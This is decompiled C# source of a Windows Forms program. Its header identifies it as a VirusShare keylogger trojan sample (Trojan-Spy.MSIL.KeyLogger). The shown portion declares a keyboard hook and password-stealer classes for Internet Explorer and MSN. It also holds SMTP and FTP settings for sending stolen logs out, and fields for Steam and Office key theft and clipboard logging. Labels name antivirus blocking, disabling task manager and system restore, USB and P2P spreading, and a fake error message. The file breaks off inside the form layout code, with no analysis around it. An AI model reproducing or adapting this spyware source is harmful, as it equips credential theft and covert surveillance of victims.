// Decompiled with JetBrains decompiler
// Type: Roy.Form1
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Roy.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.XPath;

namespace Roy
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("Label5")]
    private Label _Label5;
    [AccessedThroughProperty("Label6")]
    private Label _Label6;
    [AccessedThroughProperty("Label7")]
    private Label _Label7;
    [AccessedThroughProperty("Label8")]
    private Label _Label8;
    [AccessedThroughProperty("Label9")]
    private Label _Label9;
    [AccessedThroughProperty("Label10")]
    private Label _Label10;
    [AccessedThroughProperty("Label11")]
    private Label _Label11;
    [AccessedThroughProperty("Label12")]
    private Label _Label12;
    [AccessedThroughProperty("Label13")]
    private Label _Label13;
    [AccessedThroughProperty("Label14")]
    private Label _Label14;
    [AccessedThroughProperty("Label15")]
    private Label _Label15;
    [AccessedThroughProperty("Label16")]
    private Label _Label16;
    [AccessedThroughProperty("Label17")]
    private Label _Label17;
    [AccessedThroughProperty("Label18")]
    private Label _Label18;
    [AccessedThroughProperty("Label19")]
    private Label _Label19;
    [AccessedThroughProperty("Label20")]
    private Label _Label20;
    [AccessedThroughProperty("Label21")]
    private Label _Label21;
    [AccessedThroughProperty("Label22")]
    private Label _Label22;
    [AccessedThroughProperty("Label23")]
    private Label _Label23;
    [AccessedThroughProperty("Label24")]
    private Label _Label24;
    [AccessedThroughProperty("Label25")]
    private Label _Label25;
    [AccessedThroughProperty("Label26")]
    private Label _Label26;
    [AccessedThroughProperty("Label27")]
    private Label _Label27;
    [AccessedThroughProperty("Label28")]
    private Label _Label28;
    [AccessedThroughProperty("Label29")]
    private Label _Label29;
    [AccessedThroughProperty("Label30")]
    private Label _Label30;
    [AccessedThroughProperty("Label31")]
    private Label _Label31;
    [AccessedThroughProperty("Label32")]
    private Label _Label32;
    [AccessedThroughProperty("Label33")]
    private Label _Label33;
    [AccessedThroughProperty("TextBox5")]
    private TextBox _TextBox5;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("Label34")]
    private Label _Label34;
    [AccessedThroughProperty("TextBox6")]
    private TextBox _TextBox6;
    [AccessedThroughProperty("TextBox7")]
    private TextBox _TextBox7;
    [AccessedThroughProperty("TextBox8")]
    private TextBox _TextBox8;
    [AccessedThroughProperty("TextBox9")]
    private TextBox _TextBox9;
    [AccessedThroughProperty("TextBox10")]
    private TextBox _TextBox10;
    [AccessedThroughProperty("Label36")]
    private Label _Label36;
    [AccessedThroughProperty("Label35")]
    private Label _Label35;
    [AccessedThroughProperty("lblNumb")]
    private Label _lblNumb;
    [AccessedThroughProperty("TextBox11")]
    private TextBox _TextBox11;
    [AccessedThroughProperty("TextBox12")]
    private TextBox _TextBox12;
    [AccessedThroughProperty("Label37")]
    private Label _Label37;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("Timer5")]
    private System.Windows.Forms.Timer _Timer5;
    [AccessedThroughProperty("TextBox13")]
    private TextBox _TextBox13;
    [AccessedThroughProperty("Label39")]
    private Label _Label39;
    [AccessedThroughProperty("Label38")]
    private Label _Label38;
    [AccessedThroughProperty("Label40")]
    private Label _Label40;
    [AccessedThroughProperty("Label41")]
    private Label _Label41;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    [AccessedThroughProperty("Timer6")]
    private System.Windows.Forms.Timer _Timer6;
    [AccessedThroughProperty("Timer7")]
    private System.Windows.Forms.Timer _Timer7;
    [AccessedThroughProperty("TextBox14")]
    private TextBox _TextBox14;
    [AccessedThroughProperty("TextBox15")]
    private TextBox _TextBox15;
    [AccessedThroughProperty("TextBox16")]
    private TextBox _TextBox16;
    [AccessedThroughProperty("TextBox17")]
    private TextBox _TextBox17;
    [AccessedThroughProperty("Label42")]
    private Label _Label42;
    [AccessedThroughProperty("TextBox18")]
    private TextBox _TextBox18;
    [AccessedThroughProperty("TextBox19")]
    private TextBox _TextBox19;
    [AccessedThroughProperty("TextBox20")]
    private TextBox _TextBox20;
    [AccessedThroughProperty("Label43")]
    private Label _Label43;
    [AccessedThroughProperty("Label44")]
    private Label _Label44;
    [AccessedThroughProperty("Label45")]
    private Label _Label45;
    [AccessedThroughProperty("Label46")]
    private Label _Label46;
    [AccessedThroughProperty("Label47")]
    private Label _Label47;
    [AccessedThroughProperty("Label48")]
    private Label _Label48;
    private string text1;
    private string text2;
    private string text3;
    private string numberval;
    private string cb1;
    private string cb2;
    private string cb3;
    private string cb4;
    private string cb5;
    private string cb6;
    private string cb7;
    private string cb8;
    private string cb9;
    private string cb10;
    private string cb11;
    private string cb12;
    private string cb13;
    private string cb14;
    private string cb15;
    private string cb16;
    private string cb17;
    private string cb18;
    private string cb19;
    private string cb20;
    private string cb21;
    private string cb22;
    private string cb23;
    private string cb24;
    private string cb25;
    private string cb26;
    private string cb27;
    private string cb28;
    private string cb29;
    private string cb30;
    private string logsspt;
    private string smtpgmail;
    private string smtp;
    private string port;
    private string ftpfolder;
    private string filezafter;
    private string skey;
    private string rdurl;
    private string rdfilename;
    private string fakesub;
    private string fakebody;
    private string fakeerror;
    private string sername;
    private string wlist;
    private string dpath;
    private string chromefuck;
    private string dynfuck;
    private string @out;
    private string imvu;
    private string NoIpBox;
    private string Pigtext;
    private string filez;
    private CIEPasswords PIE;
    private string ie;
    private string msn1;
    private string msn2;
    private CMSNExplorerPasswords PMSNExplorer;
    private CMSNMessengerPasswords PMSNMessenger;
    private CIE7Passwords PIESEVEN;
    private string idmname;
    private string idmemail;
    private string idmserial;
    private string idmpass;
    private string fuckcheck;
    private string clip;
    private string nl;
    private string totalfuckshit;
    private string cd_tot;
    private string attact_fuck;
    private string officekey;
    private string pros_name;
    private string installdate;
    private string computername;
    private string l_drivers;
    private RegistryKey m_LM;
    private RegistryKey m_HW;
    private RegistryKey m_Des;
    private RegistryKey m_System;
    private RegistryKey m_CPU;
    private RegistryKey m_Info;
    private string os_manu;
    private string motherbo_name;
    private string motherbo_product;
    private string motherbo_serial;
    private string total_Fuck_CpInformtion;
    private string Cp_ip;
    private string ftp_increment;
    private string steam_fuckkey;
    private DateTime dteData;
    private string datenow;
    private string ftp_upload_NewxFuck;
    private const string FileSplit = "@Rapid@";
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private string strin;
    private string ans;
    [AccessedThroughProperty("m_MediaConnectWatcher")]
    private ManagementEventWatcher _m_MediaConnectWatcher;
    public string details;
    private string Targetdrive;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.skey = "highckcisrtg/ahf89qu4uq9qur9e9ir9qu9rujncjnajfduaufjanfjudhfanfjnjaujw$%#*VSHBVDKafmiarenaf97(Dffafdghjykiuishsfgr5456afadghtrytfffutuiobxnkd";
      this.dpath = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
      this.@out = "";
      this.PIE = new CIEPasswords();
      this.PMSNExplorer = new CMSNExplorerPasswords();
      this.PMSNMessenger = new CMSNMessengerPasswords();
      this.PIESEVEN = new CIE7Passwords();
      this.nl = Environment.NewLine;
      this.attact_fuck = this.dpath + "\\cdkeys.txt";
      this.ftp_increment = Conversions.ToString(1);
      this.datenow = DateTime.Now.ToString().Replace("/", "-").Replace(" ", "---").Replace(":", "-");
      this.kbHook = new Form1.KeyboardHook();
      this.strin = (string) null;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox4 = new TextBox();
      this.TextBox3 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox1 = new TextBox();
      this.Label1 = new Label();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.Label5 = new Label();
      this.Label6 = new Label();
      this.Label7 = new Label();
      this.Label8 = new Label();
      this.Label9 = new Label();
      this.Label10 = new Label();
      this.Label11 = new Label();
      this.Label12 = new Label();
      this.Label13 = new Label();
      this.Label14 = new Label();
      this.Label15 = new Label();
      this.Label16 = new Label();
      this.Label17 = new Label();
      this.Label18 = new Label();
      this.Label19 = new Label();
      this.Label20 = new Label();
      this.Label21 = new Label();
      this.Label22 = new Label();
      this.Label23 = new Label();
      this.Label24 = new Label();
      this.Label25 = new Label();
      this.Label26 = new Label();
      this.Label27 = new Label();
      this.Label28 = new Label();
      this.Label29 = new Label();
      this.Label30 = new Label();
      this.Label31 = new Label();
      this.Label32 = new Label();
      this.Label33 = new Label();
      this.TextBox5 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.Label34 = new Label();
      this.TextBox6 = new TextBox();
      this.TextBox7 = new TextBox();
      this.TextBox8 = new TextBox();
      this.TextBox9 = new TextBox();
      this.TextBox10 = new TextBox();
      this.Label36 = new Label();
      this.Label35 = new Label();
      this.lblNumb = new Label();
      this.TextBox11 = new TextBox();
      this.TextBox12 = new TextBox();
      this.Label37 = new Label();
      this.ListBox1 = new ListBox();
      this.Timer5 = new System.Windows.Forms.Timer(this.components);
      this.TextBox13 = new TextBox();
      this.Label39 = new Label();
      this.Label38 = new Label();
      this.Label40 = new Label();
      this.Label41 = new Label();
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.Timer6 = new System.Windows.Forms.Timer(this.components);
      this.Timer7 = new System.Windows.Forms.Timer(this.components);
      this.TextBox14 = new TextBox();
      this.TextBox15 = new TextBox();
      this.TextBox16 = new TextBox();
      this.TextBox17 = new TextBox();
      this.Label42 = new Label();
      this.TextBox18 = new TextBox();
      this.TextBox19 = new TextBox();
      this.TextBox20 = new TextBox();
      this.Label43 = new Label();
      this.Label44 = new Label();
      this.Label45 = new Label();
      this.Label46 = new Label();
      this.Label47 = new Label();
      this.Label48 = new Label();
      this.SuspendLayout();
      TextBox textBox4_1 = this.TextBox4;
      Point point1 = new Point(308, 68);
      Point point2 = point1;
      textBox4_1.Location = point2;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      Size size1 = new Size(138, 20);
      Size size2 = size1;
      textBox4_2.Size = size2;
      this.TextBox4.TabIndex = 126;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(308, 42);
      Point point3 = point1;
      textBox3_1.Location = point3;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(138, 20);
      Size size3 = size1;
      textBox3_2.Size = size3;
      this.TextBox3.TabIndex = 125;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(308, 16);
      Point point4 = point1;
      textBox2_1.Location = point4;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(138, 20);
      Size size4 = size1;
      textBox2_2.Size = size4;
      this.TextBox2.TabIndex = 124;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(22, 12);
      Point point5 = point1;
      textBox1_1.Location = point5;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.ScrollBars = ScrollBars.Vertical;
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(280, 226);
      Size size5 = size1;
      textBox1_2.Size = size5;
      this.TextBox1.TabIndex = 123;
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(90, 259);
      Point point6 = point1;
      label1_1.Location = point6;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(56, 13);
      Size size6 = size1;
      label1_2.Size = size6;
      this.Label1.TabIndex = (int) sbyte.MaxValue;
      this.Label1.Text = "numberval";
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(90, 294);
      Point point7 = point1;
      label2_1.Location = point7;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(49, 13);
      Size size7 = size1;
      label2_2.Size = size7;
      this.Label2.TabIndex = 128;
      this.Label2.Text = "smtp|gmil";
      this.Label3.AutoSize = true;
      Label label3_1 = this.Label3;
      point1 = new Point(93, 331);
      Point point8 = point1;
      label3_1.Location = point8;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(45, 13);
      Size size8 = size1;
      label3_2.Size = size8;
      this.Label3.TabIndex = 129;
      this.Label3.Text = "ftpfolder";
      this.Label4.AutoSize = true;
      Label label4_1 = this.Label4;
      point1 = new Point(93, 365);
      Point point9 = point1;
      label4_1.Location = point9;
      this.Label4.Name = "Label4";
      Label label4_2 = this.Label4;
      size1 = new Size(29, 13);
      Size size9 = size1;
      label4_2.Size = size9;
      this.Label4.TabIndex = 130;
      this.Label4.Text = "smtp";
      this.Label5.AutoSize = true;
      Label label5_1 = this.Label5;
      point1 = new Point(96, 388);
      Point point10 = point1;
      label5_1.Location = point10;
      this.Label5.Name = "Label5";
      Label label5_2 = this.Label5;
      size1 = new Size(25, 13);
      Size size10 = size1;
      label5_2.Size = size10;
      this.Label5.TabIndex = 131;
      this.Label5.Text = "port";
      this.Label6.AutoSize = true;
      Label label6_1 = this.Label6;
      point1 = new Point(89, 416);
      Point point11 = point1;
      label6_1.Location = point11;
      this.Label6.Name = "Label6";
      Label label6_2 = this.Label6;
      size1 = new Size(56, 13);
      Size size11 = size1;
      label6_2.Size = size11;
      this.Label6.TabIndex = 132;
      this.Label6.Text = "encryption";
      this.Label7.AutoSize = true;
      Label label7_1 = this.Label7;
      point1 = new Point(99, 443);
      Point point12 = point1;
      label7_1.Location = point12;
      this.Label7.Name = "Label7";
      Label label7_2 = this.Label7;
      size1 = new Size(29, 13);
      Size size12 = size1;
      label7_2.Size = size12;
      this.Label7.TabIndex = 133;
      this.Label7.Text = "skey";
      this.Label8.AutoSize = true;
      Label label8_1 = this.Label8;
      point1 = new Point(47, 473);
      Point point13 = point1;
      label8_1.Location = point13;
      this.Label8.Name = "Label8";
      Label label8_2 = this.Label8;
      size1 = new Size(35, 13);
      Size size13 = size1;
      label8_2.Size = size13;
      this.Label8.TabIndex = 134;
      this.Label8.Text = "anties";
      this.Label9.AutoSize = true;
      Label label9_1 = this.Label9;
      point1 = new Point(207, 259);
      Point point14 = point1;
      label9_1.Location = point14;
      this.Label9.Name = "Label9";
      Label label9_2 = this.Label9;
      size1 = new Size(16, 13);
      Size size14 = size1;
      label9_2.Size = size14;
      this.Label9.TabIndex = 135;
      this.Label9.Text = "rd";
      this.Label10.AutoSize = true;
      Label label10_1 = this.Label10;
      point1 = new Point(210, 276);
      Point point15 = point1;
      label10_1.Location = point15;
      this.Label10.Name = "Label10";
      Label label10_2 = this.Label10;
      size1 = new Size(27, 13);
      Size size15 = size1;
      label10_2.Size = size15;
      this.Label10.TabIndex = 136;
      this.Label10.Text = "rdurl";
      this.Label11.AutoSize = true;
      Label label11_1 = this.Label11;
      point1 = new Point(210, 294);
      Point point16 = point1;
      label11_1.Location = point16;
      this.Label11.Name = "Label11";
      Label label11_2 = this.Label11;
      size1 = new Size(55, 13);
      Size size16 = size1;
      label11_2.Size = size16;
      this.Label11.TabIndex = 137;
      this.Label11.Text = "rdfilename";
      this.Label12.AutoSize = true;
      Label label12_1 = this.Label12;
      point1 = new Point(238, 333);
      Point point17 = point1;
      label12_1.Location = point17;
      this.Label12.Name = "Label12";
      Label label12_2 = this.Label12;
      size1 = new Size(28, 13);
      Size size17 = size1;
      label12_2.Size = size17;
      this.Label12.TabIndex = 138;
      this.Label12.Text = "fake";
      this.Label13.AutoSize = true;
      Label label13_1 = this.Label13;
      point1 = new Point(238, 362);
      Point point18 = point1;
      label13_1.Location = point18;
      this.Label13.Name = "Label13";
      Label label13_2 = this.Label13;
      size1 = new Size(45, 13);
      Size size18 = size1;
      label13_2.Size = size18;
      this.Label13.TabIndex = 139;
      this.Label13.Text = "fakesub";
      this.Label14.AutoSize = true;
      Label label14_1 = this.Label14;
      point1 = new Point(238, 389);
      Point point19 = point1;
      label14_1.Location = point19;
      this.Label14.Name = "Label14";
      Label label14_2 = this.Label14;
      size1 = new Size(51, 13);
      Size size19 = size1;
      label14_2.Size = size19;
      this.Label14.TabIndex = 140;
      this.Label14.Text = "fakebody";
      this.Label15.AutoSize = true;
      Label label15_1 = this.Label15;
      point1 = new Point(244, 413);
      Point point20 = point1;
      label15_1.Location = point20;
      this.Label15.Name = "Label15";
      Label label15_2 = this.Label15;
      size1 = new Size(52, 13);
      Size size20 = size1;
      label15_2.Size = size20;
      this.Label15.TabIndex = 141;
      this.Label15.Text = "fake error";
      this.Label16.AutoSize = true;
      Label label16_1 = this.Label16;
      point1 = new Point(247, 439);
      Point point21 = point1;
      label16_1.Location = point21;
      this.Label16.Name = "Label16";
      Label label16_2 = this.Label16;
      size1 = new Size(39, 13);
      Size size21 = size1;
      label16_2.Size = size21;
      this.Label16.TabIndex = 142;
      this.Label16.Text = "startup";
      this.Label17.AutoSize = true;
      Label label17_1 = this.Label17;
      point1 = new Point(241, 456);
      Point point22 = point1;
      label17_1.Location = point22;
      this.Label17.Name = "Label17";
      Label label17_2 = this.Label17;
      size1 = new Size(24, 13);
      Size size22 = size1;
      label17_2.Size = size22;
      this.Label17.TabIndex = 143;
      this.Label17.Text = "usb";
      this.Label18.AutoSize = true;
      Label label18_1 = this.Label18;
      point1 = new Point(228, 482);
      Point point23 = point1;
      label18_1.Location = point23;
      this.Label18.Name = "Label18";
      Label label18_2 = this.Label18;
      size1 = new Size(25, 13);
      Size size23 = size1;
      label18_2.Size = size23;
      this.Label18.TabIndex = 144;
      this.Label18.Text = "p2p";
      this.Label19.AutoSize = true;
      Label label19_1 = this.Label19;
      point1 = new Point(318, 252);
      Point point24 = point1;
      label19_1.Location = point24;
      this.Label19.Name = "Label19";
      Label label19_2 = this.Label19;
      size1 = new Size(68, 13);
      Size size24 = size1;
      label19_2.Size = size24;
      this.Label19.TabIndex = 145;
      this.Label19.Text = "screenlogger";
      this.Label20.AutoSize = true;
      Label label20_1 = this.Label20;
      point1 = new Point(327, 287);
      Point point25 = point1;
      label20_1.Location = point25;
      this.Label20.Name = "Label20";
      Label label20_2 = this.Label20;
      size1 = new Size(43, 13);
      Size size25 = size1;
      label20_2.Size = size25;
      this.Label20.TabIndex = 146;
      this.Label20.Text = "stealers";
      this.Label21.AutoSize = true;
      Label label21_1 = this.Label21;
      point1 = new Point(330, 323);
      Point point26 = point1;
      label21_1.Location = point26;
      this.Label21.Name = "Label21";
      Label label21_2 = this.Label21;
      size1 = new Size(56, 13);
      Size size26 = size1;
      label21_2.Size = size26;
      this.Label21.TabIndex = 147;
      this.Label21.Text = "disablethis";
      this.Label22.AutoSize = true;
      Label label22_1 = this.Label22;
      point1 = new Point(333, 342);
      Point point27 = point1;
      label22_1.Location = point27;
      this.Label22.Name = "Label22";
      Label label22_2 = this.Label22;
      size1 = new Size(22, 13);
      Size size27 = size1;
      label22_2.Size = size27;
      this.Label22.TabIndex = 148;
      this.Label22.Text = "run";
      this.Label23.AutoSize = true;
      Label label23_1 = this.Label23;
      point1 = new Point(330, 359);
      Point point28 = point1;
      label23_1.Location = point28;
      this.Label23.Name = "Label23";
      Label label23_2 = this.Label23;
      size1 = new Size(42, 13);
      Size size28 = size1;
      label23_2.Size = size28;
      this.Label23.TabIndex = 149;
      this.Label23.Text = "taskbar";
      this.Label24.AutoSize = true;
      Label label24_1 = this.Label24;
      point1 = new Point(325, 382);
      Point point29 = point1;
      label24_1.Location = point29;
      this.Label24.Name = "Label24";
      Label label24_2 = this.Label24;
      size1 = new Size(27, 13);
      Size size29 = size1;
      label24_2.Size = size29;
      this.Label24.TabIndex = 150;
      this.Label24.Text = "cmd";
      this.Label25.AutoSize = true;
      Label label25_1 = this.Label25;
      point1 = new Point(330, 408);
      Point point30 = point1;
      label25_1.Location = point30;
      this.Label25.Name = "Label25";
      Label label25_2 = this.Label25;
      size1 = new Size(40, 13);
      Size size30 = size1;
      label25_2.Size = size30;
      this.Label25.TabIndex = 151;
      this.Label25.Text = "registry";
      this.Label26.AutoSize = true;
      Label label26_1 = this.Label26;
      point1 = new Point(333, 435);
      Point point31 = point1;
      label26_1.Location = point31;
      this.Label26.Name = "Label26";
      Label label26_2 = this.Label26;
      size1 = new Size(49, 13);
      Size size31 = size1;
      label26_2.Size = size31;
      this.Label26.TabIndex = 152;
      this.Label26.Text = "rightclick";
      this.Label27.AutoSize = true;
      Label label27_1 = this.Label27;
      point1 = new Point(324, 461);
      Point point32 = point1;
      label27_1.Location = point32;
      this.Label27.Name = "Label27";
      Label label27_2 = this.Label27;
      size1 = new Size(67, 13);
      Size size32 = size1;
      label27_2.Size = size32;
      this.Label27.TabIndex = 153;
      this.Label27.Text = "folderoptions";
      this.Label28.AutoSize = true;
      Label label28_1 = this.Label28;
      point1 = new Point(318, 490);
      Point point33 = point1;
      label28_1.Location = point33;
      this.Label28.Name = "Label28";
      Label label28_2 = this.Label28;
      size1 = new Size(50, 13);
      Size size33 = size1;
      label28_2.Size = size33;
      this.Label28.TabIndex = 154;
      this.Label28.Text = "taskmngr";
      this.Label29.AutoSize = true;
      Label label29_1 = this.Label29;
      point1 = new Point(420, 252);
      Point point34 = point1;
      label29_1.Location = point34;
      this.Label29.Name = "Label29";
      Label label29_2 = this.Label29;
      size1 = new Size(57, 13);
      Size size34 = size1;
      label29_2.Size = size34;
      this.Label29.TabIndex = 155;
      this.Label29.Text = "av-blocker";
      this.Label30.AutoSize = true;
      Label label30_1 = this.Label30;
      point1 = new Point(420, 287);
      Point point35 = point1;
      label30_1.Location = point35;
      this.Label30.Name = "Label30";
      Label label30_2 = this.Label30;
      size1 = new Size(79, 13);
      Size size35 = size1;
      label30_2.Size = size35;
      this.Label30.TabIndex = 156;
      this.Label30.Text = "clipboardlogger";
      this.Label31.AutoSize = true;
      Label label31_1 = this.Label31;
      point1 = new Point(423, 313);
      Point point36 = point1;
      label31_1.Location = point36;
      this.Label31.Name = "Label31";
      Label label31_2 = this.Label31;
      size1 = new Size(79, 13);
      Size size36 = size1;
      label31_2.Size = size36;
      this.Label31.TabIndex = 157;
      this.Label31.Text = "deletecoockies";
      this.Label32.AutoSize = true;
      Label label32_1 = this.Label32;
      point1 = new Point(438, 333);
      Point point37 = point1;
      label32_1.Location = point37;
      this.Label32.Name = "Label32";
      Label label32_2 = this.Label32;
      size1 = new Size(39, 13);
      Size size37 = size1;
      label32_2.Size = size37;
      this.Label32.TabIndex = 158;
      this.Label32.Text = "cpanel";
      this.Label33.AutoSize = true;
      Label label33_1 = this.Label33;
      point1 = new Point(432, 379);
      Point point38 = point1;
      label33_1.Location = point38;
      this.Label33.Name = "Label33";
      Label label33_2 = this.Label33;
      size1 = new Size(54, 13);
      Size size38 = size1;
      label33_2.Size = size38;
      this.Label33.TabIndex = 159;
      this.Label33.Text = "sysrestore";
      TextBox textBox5_1 = this.TextBox5;
      point1 = new Point(466, 15);
      Point point39 = point1;
      textBox5_1.Location = point39;
      this.TextBox5.Multiline = true;
      this.TextBox5.Name = "TextBox5";
      this.TextBox5.ScrollBars = ScrollBars.Horizontal;
      TextBox textBox5_2 = this.TextBox5;
      size1 = new Size(182, 73);
      Size size39 = size1;
      textBox5_2.Size = size39;
      this.TextBox5.TabIndex = 160;
      this.Timer1.Interval = 2;
      this.Label34.AutoSize = true;
      Label label34_1 = this.Label34;
      point1 = new Point(430, 408);
      Point point40 = point1;
      label34_1.Location = point40;
      this.Label34.Name = "Label34";
      Label label34_2 = this.Label34;
      size1 = new Size(47, 13);
      Size size40 = size1;
      label34_2.Size = size40;
      this.Label34.TabIndex = 161;
      this.Label34.Text = "sername";
      TextBox textBox6_1 = this.TextBox6;
      point1 = new Point(308, 112);
      Point point41 = point1;
      textBox6_1.Location = point41;
      this.TextBox6.Multiline = true;
      this.TextBox6.Name = "TextBox6";
      this.TextBox6.ScrollBars = ScrollBars.Vertical;
      TextBox textBox6_2 = this.TextBox6;
      size1 = new Size(171, 79);
      Size size41 = size1;
      textBox6_2.Size = size41;
      this.TextBox6.TabIndex = 162;
      TextBox textBox7_1 = this.TextBox7;
      point1 = new Point(487, 94);
      Point point42 = point1;
      textBox7_1.Location = point42;
      this.TextBox7.Multiline = true;
      this.TextBox7.Name = "TextBox7";
      this.TextBox7.ScrollBars = ScrollBars.Vertical;
      TextBox textBox7_2 = this.TextBox7;
      size1 = new Size(119, 86);
      Size size42 = size1;
      textBox7_2.Size = size42;
      this.TextBox7.TabIndex = 163;
      TextBox textBox8_1 = this.TextBox8;
      point1 = new Point(638, 94);
      Point point43 = point1;
      textBox8_1.Location = point43;
      this.TextBox8.Multiline = true;
      this.TextBox8.Name = "TextBox8";
      this.TextBox8.ScrollBars = ScrollBars.Vertical;
      TextBox textBox8_2 = this.TextBox8;
      size1 = new Size(100, 86);
      Size size43 = size1;
      textBox8_2.Size = size43;
      this.TextBox8.TabIndex = 164;
      TextBox textBox9_1 = this.TextBox9;
      point1 = new Point(508, 217);
      Point point44 = point1;
      textBox9_1.Location = point44;
      this.TextBox9.Multiline = true;
      this.TextBox9.Name = "TextBox9";
      this.TextBox9.ScrollBars = ScrollBars.Vertical;
      TextBox textBox9_2 = this.TextBox9;
      size1 = new Size(261, 129);
      Size size44 = size1;
      textBox9_2.Size = size44;
      this.TextBox9.TabIndex = 165;
      TextBox textBox10_1 = this.TextBox10;
      point1 = new Point(508, 368);
      Point point45 = point1;
      textBox10_1.Location = point45;
      this.TextBox10.Multiline = true;
      this.TextBox10.Name = "TextBox10";
      TextBox textBox10_2 = this.TextBox10;
      size1 = new Size(284, 106);
      Size size45 = size1;
      textBox10_2.Size = size45;
      this.TextBox10.TabIndex = 166;
      this.Label36.AutoSize = true;
      this.Label36.Font = new Font("Microsoft Sans Serif", 8.25f);
      Label label36_1 = this.Label36;
      point1 = new Point(247, 128);
      Point point46 = point1;
      label36_1.Location = point46;
      this.Label36.Name = "Label36";
      Label label36_2 = this.Label36;
      size1 = new Size(59, 13);
      Size size46 = size1;
      label36_2.Size = size46;
      this.Label36.TabIndex = 172;
      this.Label36.Text = "overallpath";
      this.Label35.AutoSize = true;
      this.Label35.Font = new Font("Microsoft Sans Serif", 24f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label35.ForeColor = System.Drawing.Color.Red;
      Label label35_1 = this.Label35;
      point1 = new Point(685, 42);
      Point point47 = point1;
      label35_1.Location = point47;
      this.Label35.Name = "Label35";
      Label label35_2 = this.Label35;
      size1 = new Size(35, 37);
      Size size47 = size1;
      label35_2.Size = size47;
      this.Label35.TabIndex = 171;
      this.Label35.Text = "0";
      this.lblNumb.AutoSize = true;
      this.lblNumb.Font = new Font("Tahoma", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblNumb.ForeColor = System.Drawing.Color.Blue;
      Label lblNumb1 = this.lblNumb;
      point1 = new Point(400, 256);
      Point point48 = point1;
      lblNumb1.Location = point48;
      this.lblNumb.Name = "lblNumb";
      Label lblNumb2 = this.lblNumb;
      size1 = new Size(14, 13);
      Size size48 = size1;
      lblNumb2.Size = size48;
      this.lblNumb.TabIndex = 173;
      this.lblNumb.Text = "0";
      TextBox textBox11_1 = this.TextBox11;
      point1 = new Point(767, 15);
      Point point49 = point1;
      textBox11_1.Location = point49;
      this.TextBox11.Multiline = true;
      this.TextBox11.Name = "TextBox11";
      TextBox textBox11_2 = this.TextBox11;
      size1 = new Size(100, 88);
      Size size49 = size1;
      textBox11_2.Size = size49;
      this.TextBox11.TabIndex = 174;
      TextBox textBox12_1 = this.TextBox12;
      point1 = new Point(321, 207);
      Point point50 = point1;
      textBox12_1.Location = point50;
      this.TextBox12.Multiline = true;
      this.TextBox12.Name = "TextBox12";
      this.TextBox12.ScrollBars = ScrollBars.Vertical;
      TextBox textBox12_2 = this.TextBox12;
      size1 = new Size(244, 95);
      Size size50 = size1;
      textBox12_2.Size = size50;
      this.TextBox12.TabIndex = 175;
      this.Label37.AutoSize = true;
      this.Label37.ForeColor = System.Drawing.Color.Red;
      Label label37_1 = this.Label37;
      point1 = new Point(318, 205);
